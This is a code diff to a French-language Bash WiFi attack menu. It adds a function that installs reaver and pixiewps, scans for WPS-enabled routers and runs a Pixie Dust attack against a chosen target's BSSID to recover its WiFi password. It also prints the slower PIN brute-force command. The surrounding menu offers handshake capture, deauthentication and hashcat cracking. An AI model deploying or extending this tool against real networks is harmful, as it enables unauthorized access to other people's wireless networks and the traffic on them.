@@ -200,6 +200,31 @@ do_wps() {
   echo "Si ton routeur apparaît avec WPS activé : désactive WPS dans 192.168.1.1."
 }
 
+do_wps_attack() {
+  say "Attaque WPS (Pixie Dust / Reaver)"
+  local mon; mon=$(mon_iface)
+  if [ -z "$mon" ]; then echo "Active d'abord le monitor mode (option 1)."; return; fi
+  if [ -z "$(get_val BSSID)" ]; then choose_target || return; fi
+  echo "Cible : $(get_val SSID) ($(get_val BSSID), canal $(get_val CHAN))"
+  if ! command -v wash >/dev/null 2>&1 || ! command -v reaver >/dev/null 2>&1; then
+    echo "Installation de reaver + pixiewps..."
+    apt update && apt install -y reaver pixiewps || { echo "Install échouée. Vérifie internet."; return; }
+  fi
+  echo ""
+  echo "--- Scan WPS (20 secondes) : est-ce que WPS est activé ? ---"
+  timeout 20 wash -i "$mon" 2>/dev/null | head -20
+  echo ""
+  echo "--- Pixie Dust (rapide si le routeur est vulnérable) ---"
+  read -p "Lancer Pixie Dust sur $(get_val SSID) ? (o/n) : " C
+  [ "$C" = "o" ] || [ "$C" = "O" ] || { echo "Annulé."; return; }
+  reaver -i "$mon" -b "$(get_val BSSID)" -c "$(get_val CHAN)" -vv --pixie-dust 2>&1 | tee "$WORK/wps-pixie.log"
+  echo ""
+  echo "Si Pixie Dust a trouvé le PIN, le mot de passe WiFi s'affiche ci-dessus."
+  echo "Sinon, reaver peut brute-forcer le PIN (très lent, risque de blocage WPS) :"
+  echo "  reaver -i $mon -b $(get_val BSSID) -c $(get_val CHAN) -vv"
+  echo "Log : $WORK/wps-pixie.log"
+}
+
 wordlist_path() {
   if [ -f /usr/share/wordlists/rockyou.txt ]; then echo /usr/share/wordlists/rockyou.txt; return; fi
   if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
@@ -247,18 +272,20 @@ while true; do
   echo "  3) Capturer handshake / PMKID"
   echo "  4) Déauthentifier (forcer reconnexion)"
   echo "  5) Vérifier WPS"
-  echo "  6) Cracker avec hashcat (rockyou)"
-  echo "  7) Monitor mode OFF + quitter"
+  echo "  6) Attaque WPS (Pixie Dust / Reaver)"
+  echo "  7) Cracker avec hashcat (rockyou)"
+  echo "  8) Monitor mode OFF + quitter"
   echo ""
-  read -p "Choix [1-7] : " CH
+  read -p "Choix [1-8] : " CH
   case "$CH" in
     1) mon_start ;;
     2) do_scan ;;
     3) do_capture ;;
     4) do_deauth ;;
     5) do_wps ;;
-    6) do_crack ;;
-    7) mon_stop; echo "Fichiers dans $WORK"; exit 0 ;;
-    *) echo "Choix invalide (1-7)." ;;
+    6) do_wps_attack ;;
+    7) do_crack ;;
+    8) mon_stop; echo "Fichiers dans $WORK"; exit 0 ;;
+    *) echo "Choix invalide (1-8)." ;;
   esac
 done
